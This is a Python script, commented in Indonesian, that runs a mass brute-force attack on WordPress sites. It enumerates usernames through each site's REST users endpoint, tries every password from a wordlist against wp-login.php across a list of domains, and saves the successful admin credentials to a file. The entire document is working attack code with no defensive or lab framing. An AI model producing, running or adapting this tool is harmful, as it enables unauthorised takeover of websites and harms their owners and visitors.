import sys
import requests
from colorama import init, Fore

# Inisialisasi colorama
init(autoreset=True)

# Fungsi untuk mengambil username dari REST API
def get_usernames(domain):
    url = f"https://{domain}/wp-json/wp/v2/users"
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            users = response.json()
            return [user['slug'] for user in users]  # Ambil slug sebagai username
        else:
            print(f"https://{domain}/ > gagal mendapatkan username")
            return []
    except Exception as e:
        print(f"https://{domain}/ > error mengambil username")
        return []

# Fungsi untuk mencoba brute force login
def brute_force_login(domain, usernames, passwords):
    login_url = f"http://{domain}/wp-login.php"
    for username in usernames:
        for password in passwords:
            data = {'log': username, 'pwd': password}
            try:
                response = requests.post(login_url, data=data, timeout=10)
                if "wp-admin" in response.url or "dashboard" in response.text:
                    result = f"https://{domain}/wp-login.php:{username}:{password} > berhasil login admin"
                    print(Fore.GREEN + result)  # Teks hijau untuk berhasil
                    # Simpan hasil berhasil ke file ress.txt
                    with open('ress.txt', 'a') as file:
                        file.write(result + "\n")
                    return  # Berhenti setelah berhasil login
                else:
                    print(f"https://{domain}/ > gagal login admin")
            except Exception as e:
                print(f"https://{domain}/ > error saat brute force")

# Fungsi utama
def main():
    if len(sys.argv) != 3:
        print("Penggunaan: python brute_force.py <listdomain.txt> <listpassword.txt>")
        sys.exit(1)

    # Membaca daftar domain dan password dari file
    with open(sys.argv[1], 'r') as file:
        domains = file.read().splitlines()

    with open(sys.argv[2], 'r') as file:
        passwords = file.read().splitlines()

    # Proses brute force untuk setiap domain
    for domain in domains:
        usernames = get_usernames(domain)
        if usernames:
            brute_force_login(domain, usernames, passwords)

if __name__ == "__main__":
    main()
